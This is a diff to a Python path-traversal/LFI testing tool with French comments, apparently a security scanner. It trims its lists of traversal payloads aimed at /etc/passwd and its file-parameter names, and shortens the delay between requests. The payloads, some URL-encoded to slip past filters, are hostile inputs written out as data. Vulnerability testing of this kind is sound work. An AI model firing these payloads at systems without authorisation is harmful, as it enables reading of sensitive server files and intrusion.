@@ -38,18 +38,15 @@ DEFAULT_TIMEOUT = 15
 # Signature d'un /etc/passwd Unix (ligne du compte root).
 PASSWD_SIGNATURE = re.compile(r"root:.*?:0:0:")
 
-# Charges de traversée vers le fichier témoin (variantes d'encodage/contournement).
+# Charges de traversée vers le fichier témoin (les plus efficaces en tête).
 PAYLOADS = [
     "../../../../../../../../etc/passwd",
-    "....//....//....//....//....//....//etc/passwd",
     "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
-    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-    "/etc/passwd",
+    "....//....//....//....//....//....//etc/passwd",
 ]
 
-# Noms de paramètres « fichier » usuels.
-FILE_PARAMS = ["file", "path", "page", "doc", "document", "download",
-               "f", "filename", "template", "view", "read", "load", "name"]
+# Noms de paramètres « fichier » usuels (les plus courants en tête).
+FILE_PARAMS = ["file", "path", "filename", "page", "doc", "download", "f"]
 
 # Endpoints de téléchargement/lecture courants (sondés même sans découverte).
 COMMON_FILE_PATHS = ["/api/download", "/download", "/api/file", "/file",
@@ -97,7 +94,7 @@ def run_lfi_test(target_base: str,
                  candidate_urls: list[str] | None = None,
                  token: str | None = None,
                  timeout: int = DEFAULT_TIMEOUT,
-                 delay_between_requests: float = 0.5) -> dict[str, Any]:
+                 delay_between_requests: float = 0.3) -> dict[str, Any]:
     """
     Teste la traversée de répertoire / LFI sur des endpoints candidats.
 
